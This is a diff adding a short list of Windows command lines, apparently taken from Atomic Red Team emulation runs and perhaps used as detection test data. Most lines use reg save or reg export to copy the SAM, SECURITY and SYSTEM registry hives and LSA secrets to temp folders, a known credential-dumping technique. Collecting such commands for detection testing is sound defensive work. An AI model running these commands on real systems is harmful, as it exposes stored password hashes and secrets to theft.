@@ -1,0 +1,10 @@
+reg  export HKLM\sam C:\Users\thaim\AppData\Local\Temp\sam
+reg  export HKLM\security C:\Users\thaim\AppData\Local\Temp\security
+reg  export HKLM\system C:\Users\thaim\AppData\Local\Temp\system
+reg  save HKLM\sam C:\Users\thaim\AppData\Local\Temp\sam
+reg  save HKLM\security C:\Users\thaim\AppData\Local\Temp\security
+reg  save HKLM\system C:\Users\thaim\AppData\Local\Temp\system
+reg  save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE
+"reg" save HKLM\security\policy\secrets C:\Users\thaim\AppData\Local\Temp\secrets /y
+"C:\WINDOWS\system32\reg.exe" export "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg /y
+"C:\WINDOWS\system32\reg.exe" export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ C:\AtomicRedTeam\atomics\T1556.002\lsa_backup.reg
